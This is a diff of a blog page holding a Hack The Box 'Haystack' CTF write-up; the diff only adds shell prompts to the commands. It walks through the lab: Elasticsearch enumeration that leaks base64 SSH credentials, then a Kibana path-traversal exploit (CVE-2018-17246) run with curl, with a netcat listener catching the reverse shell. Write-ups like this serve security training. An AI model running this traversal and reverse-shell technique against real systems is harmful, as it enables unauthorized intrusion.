@@ -8,8 +8,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <meta name="description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.
 First thing first, let&amp;rsquo;s add the box IP to the hosts file:
-echo &amp;#39;10.10.10.115 haystack.htb&amp;#39; &amp;gt;&amp;gt; /etc/hosts User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:
-$ nmap -sV -sT -sC 10.10.10.115 Starting Nmap 7."/>
+[hg8@archbook ~]$ echo &amp;#39;10.10.10.115 haystack.htb&amp;#39; &amp;gt;&amp;gt; /etc/hosts User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:
+[hg8@archbook ~]$ nmap -sV -sT -sC 10."/>
 <meta name="keywords" content="hackthebox, ctf, haystack, gobuster, steganography, elasticsearch, logstash, kibana, elk, cve-2018-17246, lfi"/>
 <meta name="robots" content="noodp"/>
 <link rel="canonical" href="/posts/haystack/" />
@@ -192,11 +192,11 @@ $ nmap -sV -sT -sC 10.10.10.115 Starting Nmap 7."/>
     <div class="post-content">
       <p>Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.</p>
 <p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#39;10.10.10.115 haystack.htb&#39;</span> &gt;&gt; /etc/hosts
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#39;10.10.10.115 haystack.htb&#39;</span> &gt;&gt; /etc/hosts
 </code></pre></div><h1 id="user-flag">User Flag</h1>
 <h2 id="recon">Recon</h2>
 <p>Let&rsquo;s start with the classic <code>nmap</code> scan:</p>
-<pre><code>$ nmap -sV -sT -sC 10.10.10.115
+<pre><code>[hg8@archbook ~]$ nmap -sV -sT -sC 10.10.10.115
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-29 22:08 CEST
 Nmap scan report for haystack.htb (10.10.10.115)
 Host is up (0.75s latency).
@@ -212,20 +212,20 @@ Nmap done: 1 IP address (1 host up) scanned in 87.23 seconds
 <p>Once opening <a href="http://haystack.htb">http://haystack.htb</a> we are greeted with a single image.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;needle.jpg&#34;</span> /&gt;&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
 </code></pre></div><p><code>gobuster</code> doesn&rsquo;t find anything else interresting. So let&rsquo;s check this image :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget haystack.htb/needle.jpg
-$ file needle.jpg
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ wget haystack.htb/needle.jpg
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ file needle.jpg
 needle.jpg: JPEG image data, JFIF standard 1.01, resolution <span style="color:#f92672">(</span>DPI<span style="color:#f92672">)</span>, density 96x96, segment length 16, Exif Standard: <span style="color:#f92672">[</span>TIFF image data, big-endian, direntries<span style="color:#f92672">=</span>5, xresolution<span style="color:#f92672">=</span>74, yresolution<span style="color:#f92672">=</span>82, resolutionunit<span style="color:#f92672">=</span>2, software<span style="color:#f92672">=</span>paint.net 4.1.1<span style="color:#f92672">]</span>, baseline, precision 8, 1200x803, components <span style="color:#ae81ff">3</span>
 </code></pre></div><p>So far so good, nothing suspicious. Let&rsquo;s see if we can find strings in it :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings needle.jpg
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ strings needle.jpg
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg<span style="color:#f92672">==</span>
 </code></pre></div><p>Let&rsquo;s decode this base64 string :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==&#34;</span> | base64 -d
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==&#34;</span> | base64 -d
 la aguja en el pajar es <span style="color:#e6db74">&#34;clave&#34;</span>
 </code></pre></div><p>A hint. Let&rsquo;s keep <code>clave</code> in mind (key in Spanish). I think there is nothing else to find on the http service so let&rsquo;s move on to the Elasticsearch instance.</p>
 <h3 id="elasticsearch">Elasticsearch</h3>
 <p>Opening port 9200 return the following json:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">http</span> <span style="color:#960050;background-color:#1e0010">haystack.htb:</span><span style="color:#ae81ff">9200</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#960050;background-color:#1e0010">hg</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">@archbook</span> <span style="color:#960050;background-color:#1e0010">~</span>]<span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">http</span> <span style="color:#960050;background-color:#1e0010">haystack.htb:</span><span style="color:#ae81ff">9200</span>
 <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">OK</span>
 
 {
@@ -247,7 +247,7 @@ la aguja en el pajar es <span style="color:#e6db74">&#34;clave&#34;</span>
 }
 </code></pre></div><p>It&rsquo;s a classic Elastic cluster. On version 6.4.2 (not the most recent one).</p>
 <p>We can use the <code>_cat</code> endpoint to list all indexes :</p>
-<pre><code>$ http &quot;haystack.htb:9200/_cat/indices&quot;
+<pre><code>[hg8@archbook ~]$ http &quot;haystack.htb:9200/_cat/indices&quot;
 HTTP/1.1 200 OK
 
 .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    2 0  14.3kb  14.3kb
@@ -255,7 +255,7 @@ quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb
 bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb
 </code></pre><p>So we have <code>bank</code> with 1000 records and <code>quotes</code> with 253 records. Let&rsquo;s search across those documents to see if we can find something interesting with our previous hint in mind.</p>
 <p>According the the <a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.4/search-search.html">documentation</a>, we can use the <code>_search</code> endpoint to search across all documents. Searching for the keyword <code>key</code> doesn&rsquo;t seem to return any interesting user or information. Let&rsquo;s try with the <code>clave</code> keyword we found in the image :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">http</span> <span style="color:#e6db74">&#34;haystack.htb:9200/_search?q=clave&#34;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#960050;background-color:#1e0010">hg</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">@archbook</span> <span style="color:#960050;background-color:#1e0010">~</span>]<span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">http</span> <span style="color:#e6db74">&#34;haystack.htb:9200/_search?q=clave&#34;</span>
 <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">OK</span>
 
 
@@ -294,13 +294,13 @@ bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb
     <span style="color:#f92672">&#34;took&#34;</span>: <span style="color:#ae81ff">25</span>
 }
 </code></pre></div><p>Neat, sounds promising. Let&rsquo;s decode :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#39;dXNlcjogc2VjdXJpdHkg&#39;</span> | base64 -d
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#39;dXNlcjogc2VjdXJpdHkg&#39;</span> | base64 -d
 user: security
 
-$ echo <span style="color:#e6db74">&#39;cGFzczogc3BhbmlzaC5pcy5rZXk=&#39;</span> | base64 -d
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#39;cGFzczogc3BhbmlzaC5pcy5rZXk=&#39;</span> | base64 -d
 pass: spanish.is.key
 </code></pre></div><p>An username and a password, couldn&rsquo;t ask for anything better! Is that SSH credentials ?</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh security@haystack.htb
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh security@haystack.htb
 security@haystack.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
 Last login: Thu Aug <span style="color:#ae81ff">29</span> 16:24:15 <span style="color:#ae81ff">2019</span> from 10.10.10.85
 <span style="color:#f92672">[</span>security@haystack ~<span style="color:#f92672">]</span>$
@@ -325,7 +325,7 @@ kibana:x:994:992:kibana service user:/home/kibana:/sbin/nologin
 cat: /etc/logstash/conf.d/filter.conf: Permiso denegado
 </code></pre></div><p>Seems like we will need to pivot to <code>Kibana</code> or <code>Logstash</code> user to make progress.</p>
 <p>For now we don&rsquo;t have informations about neither Kibana nor Logstash. Let&rsquo;s check Elasticsearch again :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">http</span> <span style="color:#960050;background-color:#1e0010">haystack.htb:</span><span style="color:#ae81ff">9200</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#960050;background-color:#1e0010">hg</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">@archbook</span> <span style="color:#960050;background-color:#1e0010">~</span>]<span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">http</span> <span style="color:#960050;background-color:#1e0010">haystack.htb:</span><span style="color:#ae81ff">9200</span>
 <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">OK</span>
 
 {
@@ -377,7 +377,7 @@ According to the <a href="https://www.elastic.co/guide/en/kibana/current/setting
 <p>We now have every informations needed, let&rsquo;s launch our exploit:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/hg8.js&#34;</span>
 </code></pre></div><p>On our <code>netcat</code> the connection appear :</p>
-<pre><code>$ nc -l -vv -p 8585
+<pre><code>[hg8@archbook ~]$ nc -l -vv -p 8585
 Listening on any address 8585
 Connection from 10.10.10.10:53792
 id
